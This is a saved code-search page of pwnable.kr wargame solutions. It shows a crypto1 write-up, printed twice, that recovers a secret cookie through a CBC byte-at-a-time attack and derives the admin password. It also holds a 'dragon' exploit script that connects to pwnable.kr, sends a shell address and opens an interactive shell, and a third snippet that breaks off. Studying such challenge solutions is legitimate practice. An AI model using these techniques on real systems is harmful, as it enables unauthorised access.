<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01 Transitional//JP" "http://www.w3.org/TR/html4/loose.dtd">
<!-- saved from url=(0050)https://pythonexample.com/code/pwnable.kr-crypto1/ -->
<html xmlns="http://www.w3.org/1999/xhtml"><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">


<title>Pwnable.Kr Crypto1 - pythonexample.com</title>



<meta name="keywords" content="python example,python examples,python examples code,python code,python snippets, python code recipe, python source code">
<meta name="description" content="Python Code Search Engine">
<link href="./pwnable.kr [Toddler&#39;s Bottle] - codemap - 博客频道 - CSDN.NET_files/style.css" rel="stylesheet" type="text/css">
<link href="https://pythonexample.com/feed" rel="alternate" title="pythonexample.com RSS Feed" type="application/rss+xml">
<script src="./pwnable.kr [Toddler&#39;s Bottle] - codemap - 博客频道 - CSDN.NET_files/reactive_library.js"></script><script src="./pwnable.kr [Toddler&#39;s Bottle] - codemap - 博客频道 - CSDN.NET_files/ca-pub-3617567196023504.js"></script><script async="" src="./pwnable.kr [Toddler&#39;s Bottle] - codemap - 博客频道 - CSDN.NET_files/analytics.js"></script><script async="" src="./pwnable.kr [Toddler&#39;s Bottle] - codemap - 博客频道 - CSDN.NET_files/adsbygoogle.js"></script>
<script>
(adsbygoogle = window.adsbygoogle || []).push({
google_ad_client: "ca-pub-3617567196023504",
enable_page_level_ads: true
});
</script>
<style type="text/css"></style><meta name="wecite_data" id="wecite-data" content="{&quot;Title&quot;:&quot;Pwnable.Kr Crypto1 - pythonexample.com&quot;,&quot;Author&quot;:&quot;&quot;,&quot;Abstract&quot;:&quot;&quot;,&quot;Image&quot;:&quot;&quot;,&quot;Keywords&quot;:&quot;&quot;,&quot;src_likes&quot;:&quot;0&quot;,&quot;src_shares&quot;:&quot;0&quot;,&quot;src_comments&quot;:&quot;0&quot;,&quot;src_reads&quot;:&quot;0&quot;,&quot;src_up&quot;:&quot;0&quot;,&quot;src_down&quot;:&quot;0&quot;,&quot;DateTime&quot;:&quot;2017-08-01 17:03:28&quot;,&quot;Reference Type&quot;:&quot;Web Page&quot;,&quot;Year&quot;:2017,&quot;SiteType&quot;:&quot;c3&quot;,&quot;URL&quot;:&quot;https://pythonexample.com/code/pwnable.kr-crypto1/&quot;}"></head>
<body>
<div id="pageslide-body-wrap">
<div id="all">
<div id="header">
<h1><a href="https://pythonexample.com/" rel="nofollow">Python Code Search Engine</a></h1>
</div>
<div id="menu">
<div id="menu_content">
<table>
<tbody><tr>
<td><a href="https://pythonexample.com/" class="menu_icon_add">Home</a></td>
<td><a class="menu_icon_like" href="https://pythonexample.com/popular">Most Popular</a></td>
<td><a class="menu_icon_recent" href="http://jsontopojo.com/">Json to Pojo</a></td>
<td><a href="https://pythonexample.com/feed" class="menu_feed_like">RSS</a></td>
<td>
<form action="https://pythonexample.com/search" id="cse-search-box" method="GET">
<input type="text" name="q" size="20" value="pwnable.kr crypto1">
<input type="submit" value="Search">
</form>
</td>
</tr>
</tbody>
</table>
</div>
</div>
<div id="content" class="content">

<div id="code_search_results">
<div>
<script async="" src="./pwnable.kr [Toddler&#39;s Bottle] - codemap - 博客频道 - CSDN.NET_files/adsbygoogle.js"></script>
<!-- Top Search banner -->
<ins class="adsbygoogle" style="display:inline-block;width:728px;height:90px" data-ad-client="ca-pub-3617567196023504" data-ad-slot="4420150453" data-adsbygoogle-status="done"><ins id="aswift_1_expand" style="display:inline-table;border:none;height:90px;margin:0;padding:0;position:relative;visibility:visible;width:728px;background-color:transparent"><ins id="aswift_1_anchor" style="display:block;border:none;height:90px;margin:0;padding:0;position:relative;visibility:visible;width:728px;background-color:transparent"><iframe width="728" height="90" frameborder="0" marginwidth="0" marginheight="0" vspace="0" hspace="0" allowtransparency="true" scrolling="no" allowfullscreen="true" onload="var i=this.id,s=window.google_iframe_oncopy,H=s&amp;&amp;s.handlers,h=H&amp;&amp;H[i],w=this.contentWindow,d;try{d=w.document}catch(e){}if(h&amp;&amp;d&amp;&amp;(!d.body||!d.body.firstChild)){if(h.call){setTimeout(h,0)}else if(h.match){try{h=s.upd(h,i)}catch(e){}w.location.replace(h)}}" id="aswift_1" name="aswift_1" style="left:0;position:absolute;top:0;width:728px;height:90px;" src="./pwnable.kr [Toddler&#39;s Bottle] - codemap - 博客频道 - CSDN.NET_files/saved_resource.html"></iframe></ins></ins></ins>
<script>
(adsbygoogle = window.adsbygoogle || []).push({});
</script>
</div>
<div class="header">
<div class="title"><h1>Pwnable.Kr Crypto1</h1></div>
<div class="info">(0.0850851535797 seconds)</div>
</div>
<div id="mysnippets_pages">
1 pages :



<span class="paginate-current">1</span>



</div>





<div class="result">
<h2 class="title">
<a href="https://pythonexample.com/user/ihciah">ihciah</a>/<a href="https://pythonexample.com/snippet/python/crypto1md_ihciah_python">crypto1.md</a>
<span class="language">(<a href="https://pythonexample.com/language/python/"> python</a>)</span>
</h2>
<div class="snippet">

<div><div id="highlighter_105223" class="syntaxhighlighter  python"><div class="toolbar"><span><a href="https://pythonexample.com/code/pwnable.kr-crypto1/#" class="toolbar_item command_help help">?</a></span></div><table border="0" cellpadding="0" cellspacing="0"><tbody><tr><td class="gutter"><div class="line number1 index0 alt2">1</div><div class="line number2 index1 alt1">2</div><div class="line number3 index2 alt2">3</div><div class="line number4 index3 alt1">4</div><div class="line number5 index4 alt2">5</div><div class="line number6 index5 alt1">6</div><div class="line number7 index6 alt2">7</div><div class="line number8 index7 alt1">8</div><div class="line number9 index8 alt2">9</div><div class="line number10 index9 alt1">10</div><div class="line number11 index10 alt2">11</div><div class="line number12 index11 alt1">12</div><div class="line number13 index12 alt2">13</div><div class="line number14 index13 alt1">14</div><div class="line number15 index14 alt2">15</div><div class="line number16 index15 alt1">16</div><div class="line number17 index16 alt2">17</div><div class="line number18 index17 alt1">18</div><div class="line number19 index18 alt2">19</div><div class="line number20 index19 alt1">20</div><div class="line number21 index20 alt2">21</div><div class="line number22 index21 alt1">22</div><div class="line number23 index22 alt2">23</div><div class="line number24 index23 alt1">24</div><div class="line number25 index24 alt2">25</div><div class="line number26 index25 alt1">26</div><div class="line number27 index26 alt2">27</div><div class="line number28 index27 alt1">28</div><div class="line number29 index28 alt2">29</div><div class="line number30 index29 alt1">30</div><div class="line number31 index30 alt2">31</div></td><td class="code"><div class="container"><div class="line number1 index0 alt2"><code class="python comments"># Pwnable.kr crypto1 writeup</code></div><div class="line number2 index1 alt1"><code class="python plain">ihciah@gmail.com</code></div><div class="line number3 index2 alt2">&nbsp;</div><div class="line number4 index3 alt1"><code class="python plain">In this challenge we can </code><code class="python functions">input</code> <code class="python plain">username </code><code class="python keyword">and</code> <code class="python plain">password, then the server </code><code class="python keyword">return</code> <code class="python plain">an encrypted string of `{username}</code><code class="python keyword">-</code><code class="python plain">{password}</code><code class="python keyword">-</code><code class="python plain">{cookie}` </code><code class="python keyword">in</code> <code class="python plain">which the `cookie` </code><code class="python keyword">is</code> <code class="python keyword">not</code> <code class="python plain">known.</code></div><div class="line number5 index4 alt2">&nbsp;</div><div class="line number6 index5 alt1"><code class="python plain">Since `CBC` </code><code class="python keyword">is</code> <code class="python plain">used, each </code><code class="python value">32</code> <code class="python plain">word </code><code class="python keyword">in</code> <code class="python plain">encrypted string </code><code class="python keyword">is</code> <code class="python plain">encrypted by last block </code><code class="python keyword">and</code> <code class="python value">16</code> <code class="python plain">word </code><code class="python keyword">in</code> <code class="python plain">original string.</code></div><div class="line number7 index6 alt2">&nbsp;</div><div class="line number8 index7 alt1"><code class="python plain">So let's enter `</code><code class="python string">"A"</code><code class="python keyword">*</code><code class="python value">16</code><code class="python plain">` as username, </code><code class="python keyword">and</code> <code class="python plain">enter different password, the first </code><code class="python value">32</code> <code class="python plain">word of the encrypted data </code><code class="python keyword">is</code> <code class="python plain">the same.</code></div><div class="line number9 index8 alt2">&nbsp;</div><div class="line number10 index9 alt1"><code class="python plain">So we can brute</code><code class="python keyword">-</code><code class="python plain">force the cookie through trying each bit of cookie.</code></div><div class="line number11 index10 alt2">&nbsp;</div><div class="line number12 index11 alt1"><code class="python plain">Case A:</code></div><div class="line number13 index12 alt2"><code class="python plain">`Username </code><code class="python keyword">=</code> <code class="python string">"-"</code><code class="python keyword">*</code><code class="python value">13</code> <code class="python keyword">+</code> <code class="python plain">x`</code></div><div class="line number14 index13 alt1"><code class="python plain">`Password </code><code class="python keyword">=</code> <code class="python plain">""`</code></div><div class="line number15 index14 alt2"><code class="python plain">So `String </code><code class="python keyword">=</code> <code class="python string">"-"</code><code class="python keyword">*</code><code class="python value">15</code> <code class="python keyword">+</code> <code class="python plain">x`</code></div><div class="line number16 index15 alt1">&nbsp;</div><div class="line number17 index16 alt2"><code class="python plain">Case B:</code></div><div class="line number18 index17 alt1"><code class="python plain">`Username </code><code class="python keyword">=</code> <code class="python string">"-"</code><code class="python keyword">*</code><code class="python value">13</code><code class="python plain">`</code></div><div class="line number19 index18 alt2"><code class="python plain">`Password </code><code class="python keyword">=</code> <code class="python plain">""`</code></div><div class="line number20 index19 alt1"><code class="python plain">So `String </code><code class="python keyword">=</code> <code class="python string">"-"</code><code class="python keyword">*</code><code class="python value">15</code> <code class="python keyword">+</code> <code class="python plain">cookie`</code></div><div class="line number21 index20 alt2">&nbsp;</div><div class="line number22 index21 alt1"><code class="python plain">We can change `x` </code><code class="python keyword">and</code> <code class="python plain">compare first, second, third... </code><code class="python value">32</code> <code class="python plain">bit.</code></div><div class="line number23 index22 alt2">&nbsp;</div><div class="line number24 index23 alt1"><code class="python plain">Write a simple script to exploit it:</code></div><div class="line number25 index24 alt2"><code class="python plain">```</code></div><div class="line number26 index25 alt1"><code class="python plain">you_will_never_guess_this_sugar_honey_salt_cookie</code></div><div class="line number27 index26 alt2"><code class="python plain">```</code></div><div class="line number28 index27 alt1">&nbsp;</div><div class="line number29 index28 alt2"><code class="python plain">Calculate `PW` through `hashlib.sha256(</code><code class="python string">"admin"</code><code class="python keyword">+</code><code class="python string">"you_will_never_guess_this_sugar_honey_salt_cookie"</code><code class="python plain">).hexdigest()`</code></div><div class="line number30 index29 alt1">&nbsp;</div><div class="line number31 index30 alt2"><code class="python functions">Input</code> <code class="python plain">username `admin` </code><code class="python keyword">and</code> <code class="python plain">password to get the flag.</code></div></div></td></tr></tbody></table></div></div>
</div>
<br>
Pwnable.kr crypto1 writeup
</div>



<!-- Composite Start -->


<div class="result">
<h2 class="title">
<a href="https://pythonexample.com/user/spnow">spnow</a>/<a href="https://pythonexample.com/snippet/python/crypto1md_spnow_python">crypto1.md</a>
<span class="language">(<a href="https://pythonexample.com/language/python/"> python</a>)</span>
</h2>
<div class="snippet">

<div><div id="highlighter_164229" class="syntaxhighlighter  python"><div class="toolbar"><span><a href="https://pythonexample.com/code/pwnable.kr-crypto1/#" class="toolbar_item command_help help">?</a></span></div><table border="0" cellpadding="0" cellspacing="0"><tbody><tr><td class="gutter"><div class="line number1 index0 alt2">1</div><div class="line number2 index1 alt1">2</div><div class="line number3 index2 alt2">3</div><div class="line number4 index3 alt1">4</div><div class="line number5 index4 alt2">5</div><div class="line number6 index5 alt1">6</div><div class="line number7 index6 alt2">7</div><div class="line number8 index7 alt1">8</div><div class="line number9 index8 alt2">9</div><div class="line number10 index9 alt1">10</div><div class="line number11 index10 alt2">11</div><div class="line number12 index11 alt1">12</div><div class="line number13 index12 alt2">13</div><div class="line number14 index13 alt1">14</div><div class="line number15 index14 alt2">15</div><div class="line number16 index15 alt1">16</div><div class="line number17 index16 alt2">17</div><div class="line number18 index17 alt1">18</div><div class="line number19 index18 alt2">19</div><div class="line number20 index19 alt1">20</div><div class="line number21 index20 alt2">21</div><div class="line number22 index21 alt1">22</div><div class="line number23 index22 alt2">23</div><div class="line number24 index23 alt1">24</div><div class="line number25 index24 alt2">25</div><div class="line number26 index25 alt1">26</div><div class="line number27 index26 alt2">27</div><div class="line number28 index27 alt1">28</div><div class="line number29 index28 alt2">29</div><div class="line number30 index29 alt1">30</div><div class="line number31 index30 alt2">31</div></td><td class="code"><div class="container"><div class="line number1 index0 alt2"><code class="python comments"># Pwnable.kr crypto1 writeup</code></div><div class="line number2 index1 alt1"><code class="python plain">ihciah@gmail.com</code></div><div class="line number3 index2 alt2">&nbsp;</div><div class="line number4 index3 alt1"><code class="python plain">In this challenge we can </code><code class="python functions">input</code> <code class="python plain">username </code><code class="python keyword">and</code> <code class="python plain">password, then the server </code><code class="python keyword">return</code> <code class="python plain">an encrypted string of `{username}</code><code class="python keyword">-</code><code class="python plain">{password}</code><code class="python keyword">-</code><code class="python plain">{cookie}` </code><code class="python keyword">in</code> <code class="python plain">which the `cookie` </code><code class="python keyword">is</code> <code class="python keyword">not</code> <code class="python plain">known.</code></div><div class="line number5 index4 alt2">&nbsp;</div><div class="line number6 index5 alt1"><code class="python plain">Since `CBC` </code><code class="python keyword">is</code> <code class="python plain">used, each </code><code class="python value">32</code> <code class="python plain">word </code><code class="python keyword">in</code> <code class="python plain">encrypted string </code><code class="python keyword">is</code> <code class="python plain">encrypted by last block </code><code class="python keyword">and</code> <code class="python value">16</code> <code class="python plain">word </code><code class="python keyword">in</code> <code class="python plain">original string.</code></div><div class="line number7 index6 alt2">&nbsp;</div><div class="line number8 index7 alt1"><code class="python plain">So let's enter `</code><code class="python string">"A"</code><code class="python keyword">*</code><code class="python value">16</code><code class="python plain">` as username, </code><code class="python keyword">and</code> <code class="python plain">enter different password, the first </code><code class="python value">32</code> <code class="python plain">word of the encrypted data </code><code class="python keyword">is</code> <code class="python plain">the same.</code></div><div class="line number9 index8 alt2">&nbsp;</div><div class="line number10 index9 alt1"><code class="python plain">So we can brute</code><code class="python keyword">-</code><code class="python plain">force the cookie through trying each bit of cookie.</code></div><div class="line number11 index10 alt2">&nbsp;</div><div class="line number12 index11 alt1"><code class="python plain">Case A:</code></div><div class="line number13 index12 alt2"><code class="python plain">`Username </code><code class="python keyword">=</code> <code class="python string">"-"</code><code class="python keyword">*</code><code class="python value">13</code> <code class="python keyword">+</code> <code class="python plain">x`</code></div><div class="line number14 index13 alt1"><code class="python plain">`Password </code><code class="python keyword">=</code> <code class="python plain">""`</code></div><div class="line number15 index14 alt2"><code class="python plain">So `String </code><code class="python keyword">=</code> <code class="python string">"-"</code><code class="python keyword">*</code><code class="python value">15</code> <code class="python keyword">+</code> <code class="python plain">x`</code></div><div class="line number16 index15 alt1">&nbsp;</div><div class="line number17 index16 alt2"><code class="python plain">Case B:</code></div><div class="line number18 index17 alt1"><code class="python plain">`Username </code><code class="python keyword">=</code> <code class="python string">"-"</code><code class="python keyword">*</code><code class="python value">13</code><code class="python plain">`</code></div><div class="line number19 index18 alt2"><code class="python plain">`Password </code><code class="python keyword">=</code> <code class="python plain">""`</code></div><div class="line number20 index19 alt1"><code class="python plain">So `String </code><code class="python keyword">=</code> <code class="python string">"-"</code><code class="python keyword">*</code><code class="python value">15</code> <code class="python keyword">+</code> <code class="python plain">cookie`</code></div><div class="line number21 index20 alt2">&nbsp;</div><div class="line number22 index21 alt1"><code class="python plain">We can change `x` </code><code class="python keyword">and</code> <code class="python plain">compare first, second, third... </code><code class="python value">32</code> <code class="python plain">bit.</code></div><div class="line number23 index22 alt2">&nbsp;</div><div class="line number24 index23 alt1"><code class="python plain">Write a simple script to exploit it:</code></div><div class="line number25 index24 alt2"><code class="python plain">```</code></div><div class="line number26 index25 alt1"><code class="python plain">you_will_never_guess_this_sugar_honey_salt_cookie</code></div><div class="line number27 index26 alt2"><code class="python plain">```</code></div><div class="line number28 index27 alt1">&nbsp;</div><div class="line number29 index28 alt2"><code class="python plain">Calculate `PW` through `hashlib.sha256(</code><code class="python string">"admin"</code><code class="python keyword">+</code><code class="python string">"you_will_never_guess_this_sugar_honey_salt_cookie"</code><code class="python plain">).hexdigest()`</code></div><div class="line number30 index29 alt1">&nbsp;</div><div class="line number31 index30 alt2"><code class="python functions">Input</code> <code class="python plain">username `admin` </code><code class="python keyword">and</code> <code class="python plain">password to get the flag.</code></div></div></td></tr></tbody></table></div></div>
</div>
<br>
Pwnable.kr crypto1 writeup
</div>




<script async="" src="./pwnable.kr [Toddler&#39;s Bottle] - codemap - 博客频道 - CSDN.NET_files/adsbygoogle.js"></script>
<!-- Top Search banner -->
<ins class="adsbygoogle" style="display:inline-block;width:728px;height:90px" data-ad-client="ca-pub-3617567196023504" data-ad-slot="4420150453" data-adsbygoogle-status="done"><ins id="aswift_2_expand" style="display:inline-table;border:none;height:90px;margin:0;padding:0;position:relative;visibility:visible;width:728px;background-color:transparent"><ins id="aswift_2_anchor" style="display:block;border:none;height:90px;margin:0;padding:0;position:relative;visibility:visible;width:728px;background-color:transparent"><iframe width="728" height="90" frameborder="0" marginwidth="0" marginheight="0" vspace="0" hspace="0" allowtransparency="true" scrolling="no" allowfullscreen="true" onload="var i=this.id,s=window.google_iframe_oncopy,H=s&amp;&amp;s.handlers,h=H&amp;&amp;H[i],w=this.contentWindow,d;try{d=w.document}catch(e){}if(h&amp;&amp;d&amp;&amp;(!d.body||!d.body.firstChild)){if(h.call){setTimeout(h,0)}else if(h.match){try{h=s.upd(h,i)}catch(e){}w.location.replace(h)}}" id="aswift_2" name="aswift_2" style="left:0;position:absolute;top:0;width:728px;height:90px;" src="./pwnable.kr [Toddler&#39;s Bottle] - codemap - 博客频道 - CSDN.NET_files/saved_resource(1).html"></iframe></ins></ins></ins>
<script>
(adsbygoogle = window.adsbygoogle || []).push({});
</script>

<div class="result">
<h2 class="title">
<a href="https://pythonexample.com/user/spnow">spnow</a>/<a href="https://pythonexample.com/snippet/python/pwnpy_spnow_python">pwn.py</a>
<span class="language">(<a href="https://pythonexample.com/language/python/"> python</a>)</span>
</h2>
<div class="snippet">

<div><div id="highlighter_908779" class="syntaxhighlighter  python"><div class="toolbar"><span><a href="https://pythonexample.com/code/pwnable.kr-crypto1/#" class="toolbar_item command_help help">?</a></span></div><table border="0" cellpadding="0" cellspacing="0"><tbody><tr><td class="gutter"><div class="line number1 index0 alt2">1</div><div class="line number2 index1 alt1">2</div><div class="line number3 index2 alt2">3</div><div class="line number4 index3 alt1">4</div><div class="line number5 index4 alt2">5</div><div class="line number6 index5 alt1">6</div><div class="line number7 index6 alt2">7</div><div class="line number8 index7 alt1">8</div><div class="line number9 index8 alt2">9</div><div class="line number10 index9 alt1">10</div><div class="line number11 index10 alt2">11</div><div class="line number12 index11 alt1">12</div><div class="line number13 index12 alt2">13</div><div class="line number14 index13 alt1">14</div><div class="line number15 index14 alt2">15</div><div class="line number16 index15 alt1">16</div><div class="line number17 index16 alt2">17</div><div class="line number18 index17 alt1">18</div><div class="line number19 index18 alt2">19</div><div class="line number20 index19 alt1">20</div><div class="line number21 index20 alt2">21</div><div class="line number22 index21 alt1">22</div><div class="line number23 index22 alt2">23</div><div class="line number24 index23 alt1">24</div><div class="line number25 index24 alt2">25</div><div class="line number26 index25 alt1">26</div><div class="line number27 index26 alt2">27</div><div class="line number28 index27 alt1">28</div><div class="line number29 index28 alt2">29</div><div class="line number30 index29 alt1">30</div><div class="line number31 index30 alt2">31</div><div class="line number32 index31 alt1">32</div><div class="line number33 index32 alt2">33</div><div class="line number34 index33 alt1">34</div><div class="line number35 index34 alt2">35</div><div class="line number36 index35 alt1">36</div><div class="line number37 index36 alt2">37</div><div class="line number38 index37 alt1">38</div><div class="line number39 index38 alt2">39</div><div class="line number40 index39 alt1">40</div><div class="line number41 index40 alt2">41</div><div class="line number42 index41 alt1">42</div><div class="line number43 index42 alt2">43</div><div class="line number44 index43 alt1">44</div><div class="line number45 index44 alt2">45</div><div class="line number46 index45 alt1">46</div><div class="line number47 index46 alt2">47</div><div class="line number48 index47 alt1">48</div><div class="line number49 index48 alt2">49</div><div class="line number50 index49 alt1">50</div><div class="line number51 index50 alt2">51</div><div class="line number52 index51 alt1">52</div><div class="line number53 index52 alt2">53</div><div class="line number54 index53 alt1">54</div><div class="line number55 index54 alt2">55</div></td><td class="code"><div class="container"><div class="line number1 index0 alt2"><code class="python comments">#! /usr/bin/python</code></div><div class="line number2 index1 alt1">&nbsp;</div><div class="line number3 index2 alt2"><code class="python comments"># gandung@ppp.cylab.cmu.edu</code></div><div class="line number4 index3 alt1">&nbsp;</div><div class="line number5 index4 alt2"><code class="python keyword">import</code> <code class="python plain">sys</code></div><div class="line number6 index5 alt1"><code class="python keyword">import</code> <code class="python plain">struct</code></div><div class="line number7 index6 alt2"><code class="python keyword">import</code> <code class="python plain">socket</code></div><div class="line number8 index7 alt1"><code class="python keyword">import</code> <code class="python plain">telnetlib</code></div><div class="line number9 index8 alt2">&nbsp;</div><div class="line number10 index9 alt1"><code class="python keyword">if</code> <code class="python plain">sys.byteorder </code><code class="python keyword">=</code><code class="python keyword">=</code> <code class="python string">'little'</code><code class="python plain">:</code></div><div class="line number11 index10 alt2"><code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python plain">Q </code><code class="python keyword">=</code> <code class="python keyword">lambda</code> <code class="python plain">x: struct.pack(</code><code class="python string">"&lt;I"</code><code class="python plain">, x)</code></div><div class="line number12 index11 alt1"><code class="python keyword">elif</code> <code class="python plain">sys.byteorder </code><code class="python keyword">=</code><code class="python keyword">=</code> <code class="python string">'big'</code><code class="python plain">:</code></div><div class="line number13 index12 alt2"><code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python plain">Q </code><code class="python keyword">=</code> <code class="python keyword">lambda</code> <code class="python plain">x: struct.pack(</code><code class="python string">"&gt;I"</code><code class="python plain">, x)</code></div><div class="line number14 index13 alt1">&nbsp;</div><div class="line number15 index14 alt2"><code class="python plain">shell </code><code class="python keyword">=</code> <code class="python plain">Q(</code><code class="python value">0x08048dbf</code><code class="python plain">)</code></div><div class="line number16 index15 alt1">&nbsp;</div><div class="line number17 index16 alt2"><code class="python keyword">try</code><code class="python plain">:</code></div><div class="line number18 index17 alt1"><code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python plain">s </code><code class="python keyword">=</code> <code class="python plain">socket.create_connection((</code><code class="python string">"pwnable.kr"</code><code class="python plain">, </code><code class="python value">9004</code><code class="python plain">))</code></div><div class="line number19 index18 alt2"><code class="python keyword">except</code> <code class="python plain">socket.gaierror as e:</code></div><div class="line number20 index19 alt1"><code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python plain">(n, q) </code><code class="python keyword">=</code> <code class="python plain">e</code></div><div class="line number21 index20 alt2">&nbsp;</div><div class="line number22 index21 alt1"><code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python plain">sys.exit(</code><code class="python keyword">-</code><code class="python value">1</code><code class="python plain">)</code></div><div class="line number23 index22 alt2">&nbsp;</div><div class="line number24 index23 alt1"><code class="python comments"># loop until we meet weaker dragon...</code></div><div class="line number25 index24 alt2"><code class="python keyword">for</code> <code class="python plain">i </code><code class="python keyword">in</code> <code class="python functions">range</code><code class="python plain">(</code><code class="python value">4</code><code class="python plain">):</code></div><div class="line number26 index25 alt1"><code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python keyword">try</code><code class="python plain">:</code></div><div class="line number27 index26 alt2"><code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python plain">s.send(</code><code class="python string">'1'</code> <code class="python keyword">+</code> <code class="python functions">chr</code><code class="python plain">(</code><code class="python value">0x0a</code><code class="python plain">))</code></div><div class="line number28 index27 alt1"><code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python keyword">except</code> <code class="python plain">socket.error as e:</code></div><div class="line number29 index28 alt2"><code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python plain">(n, q) </code><code class="python keyword">=</code> <code class="python plain">e</code></div><div class="line number30 index29 alt1">&nbsp;</div><div class="line number31 index30 alt2"><code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python plain">sys.exit(</code><code class="python keyword">-</code><code class="python value">1</code><code class="python plain">)</code></div><div class="line number32 index31 alt1">&nbsp;</div><div class="line number33 index32 alt2"><code class="python comments"># because mama dragon type is maximum life limit is 127...</code></div><div class="line number34 index33 alt1"><code class="python comments"># just do 'holyshield' 2-times each and do 'clarity' 1-times each..</code></div><div class="line number35 index34 alt2"><code class="python keyword">for</code> <code class="python plain">i </code><code class="python keyword">in</code> <code class="python functions">range</code><code class="python plain">(</code><code class="python value">4</code><code class="python plain">):</code></div><div class="line number36 index35 alt1"><code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python keyword">try</code><code class="python plain">:</code></div><div class="line number37 index36 alt2"><code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python plain">s.send(</code><code class="python string">'3'</code> <code class="python keyword">+</code> <code class="python functions">chr</code><code class="python plain">(</code><code class="python value">0x0a</code><code class="python plain">))</code></div><div class="line number38 index37 alt1"><code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python plain">s.send(</code><code class="python string">'3'</code> <code class="python keyword">+</code> <code class="python functions">chr</code><code class="python plain">(</code><code class="python value">0x0a</code><code class="python plain">))</code></div><div class="line number39 index38 alt2"><code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python plain">s.send(</code><code class="python string">'2'</code> <code class="python keyword">+</code> <code class="python functions">chr</code><code class="python plain">(</code><code class="python value">0x0a</code><code class="python plain">))</code></div><div class="line number40 index39 alt1"><code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python keyword">except</code> <code class="python plain">socket.error as e:</code></div><div class="line number41 index40 alt2"><code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python plain">(n, q) </code><code class="python keyword">=</code> <code class="python plain">e</code></div><div class="line number42 index41 alt1">&nbsp;</div><div class="line number43 index42 alt2"><code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python plain">sys.exit(</code><code class="python keyword">-</code><code class="python value">1</code><code class="python plain">)</code></div><div class="line number44 index43 alt1">&nbsp;</div><div class="line number45 index44 alt2"><code class="python comments"># and then, send our 'shell' address and u are set..</code></div><div class="line number46 index45 alt1"><code class="python keyword">try</code><code class="python plain">:</code></div><div class="line number47 index46 alt2"><code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python plain">s.send(shell </code><code class="python keyword">+</code> <code class="python functions">chr</code><code class="python plain">(</code><code class="python value">0x0a</code><code class="python plain">))</code></div><div class="line number48 index47 alt1"><code class="python keyword">except</code> <code class="python plain">socket.error as e:</code></div><div class="line number49 index48 alt2"><code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python plain">(n, q) </code><code class="python keyword">=</code> <code class="python plain">e</code></div><div class="line number50 index49 alt1">&nbsp;</div><div class="line number51 index50 alt2"><code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python plain">sys.exit(</code><code class="python keyword">-</code><code class="python value">1</code><code class="python plain">)</code></div><div class="line number52 index51 alt1">&nbsp;</div><div class="line number53 index52 alt2"><code class="python plain">t </code><code class="python keyword">=</code> <code class="python plain">telnetlib.Telnet()</code></div><div class="line number54 index53 alt1"><code class="python plain">t.sock </code><code class="python keyword">=</code> <code class="python plain">s</code></div><div class="line number55 index54 alt2"><code class="python plain">t.interact()</code></div></div></td></tr></tbody></table></div></div>
</div>
<br>
pwnable.kr dragon
</div>




<div class="result">
<h2 class="title">
<a href="https://pythonexample.com/user/Littlepwny">Littlepwny</a>/<a href="https://pythonexample.com/snippet/python/echo1py_littlepwny_python">echo1.py</a>
<span class="language">(<a href="https://pythonexample.com/language/python/"> python</a>)</span>
</h2>
<div class="snippet">

<div><div id="highlighter_515492" class="syntaxhighlighter  python"><div class="toolbar"><span><a href="https://pythonexample.com/code/pwnable.kr-crypto1/#" class="toolbar_item command_help help">?</a></span></div><table border="0" cellpadding="0" cellspacing="0"><tbody><tr><td class="gutter"><div class="line number1 index0 alt2">1</div><div class="line number2 index1 alt1">2</div><div class="line number3 index2 alt2">3</div><div class="line number4 index3 alt1">4</div><div class="line number5 index4 alt2">5</div><div class="line number6 index5 alt1">6</div><div class="line number7 index6 alt2">7</div><div class="line number8 index7 alt1">8</div><div class="line number9 index8 alt2">9</div><div class="line number10 index9 alt1">10</div><div class="line number11 index10 alt2">11</div><div class="line number12 index11 alt1">12</div><div class="line number13 index12 alt2">13</div><div class="line number14 index13 alt1">14</div><div class="line number15 index14 alt2">15</div><div class="line number16 index15 alt1">16</div><div class="line number17 index16 alt2">17</div><div class="line number18 index17 alt1">18</div><div class="line number19 index18 alt2">19</div><div class="line number20 index19 alt1">20</div><div class="line number21 index20 alt2">21</div><div class="line number22 index21 alt1">22</div><div class="line number23 index22 alt2">23</div><div class="line number24 index23 alt1">24</div><div class="line number25 index24 alt2">25</div><div class="line number26 index25 alt1">26</div><div class="line number27 index26 alt2">27</div><div class="line number28 index27 alt1">28</div><div class="line number29 index28 alt2">29</div><div class="line number30 index29 alt1">30</div><div class="line number31 index30 alt2">31</div><div class="line number32 index31 alt1">32</div><div class="line number33 index32 alt2">33</div><div class="line number34 index33 alt1">34</div></td><td class="code"><div class="container"><div class="line number1 index0 alt2"><code class="python comments">#!/usr/bin/python</code></div><div class="line number2 index1 alt1">&nbsp;</div><div class="line number3 index2 alt2"><code class="python comments">#author : Abdeljalil 